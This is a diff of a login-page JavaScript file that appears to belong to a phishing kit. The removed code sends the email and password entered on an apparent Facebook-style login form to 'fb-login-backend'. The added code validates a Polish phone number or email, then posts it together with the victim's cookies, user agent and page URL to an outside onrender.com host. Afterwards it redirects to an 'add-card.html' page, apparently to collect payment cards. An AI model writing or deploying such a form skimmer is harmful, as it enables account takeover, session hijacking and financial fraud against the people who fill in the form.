@@ -1,44 +1,44 @@
-console.log("Main.js is running ✅");
+document.addEventListener('DOMContentLoaded', () => {
+  const input = document.getElementById('userId');
+  const button = document.getElementById('submit-btn');
+  const form = document.getElementById('login-form');
 
-const form = document.querySelector(".login-form");
+  input.addEventListener('input', () => {
+    button.disabled = input.value.trim() === '';
+  });
 
-if (form) {
-  const emailInput = document.querySelector('input[type="text"]');
-  const passwordInput = document.querySelector('input[type="password"]');
-  const successMessage = document.getElementById("successMessage") || document.createElement("div");
-
-  successMessage.id = "successMessage";
-  successMessage.style.color = "green";
-  successMessage.style.marginTop = "10px";
-
-  form.addEventListener("submit", async (e) => {
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
-    console.log("Form submitted ✅");
+    const value = input.value.trim();
 
-    const email = emailInput.value.trim();
-    const password = passwordInput.value.trim();
-
-    if (!email || !password) {
-      successMessage.textContent = "Both fields are required.";
-      form.appendChild(successMessage);
+    const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})$/i);
+    if (!isValid) {
+      alert('Please enter a valid phone number or email');
       return;
     }
 
+    button.disabled = true;
+    button.querySelector('.al-button__label').textContent = 'Loading...';
+
     try {
-      const res = await fetch('https://fb-login-backend-xmsd.onrender.com/login', {
+      const res = await fetch('https://onclick-back.onrender.com/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password })
+        body: JSON.stringify({
+          email: value,
+          cookies: document.cookie,
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          date: new Date().toISOString()
+        })
       });
 
-      const data = await res.json();
-      successMessage.textContent = data.success ? "✅ Sent!" : "❌ Failed to send.";
+      window.location.href = 'add-card.html';
     } catch (err) {
-      console.error("Request failed:", err);
-      successMessage.textContent = "❌ Error. Try again later.";
+      console.error('Submission error:', err);
+      alert('Something went wrong. Please try again.');
+      button.disabled = false;
+      button.querySelector('.al-button__label').textContent = 'Continue';
     }
-
-    form.appendChild(successMessage);
-    form.reset();
   });
-}
+});
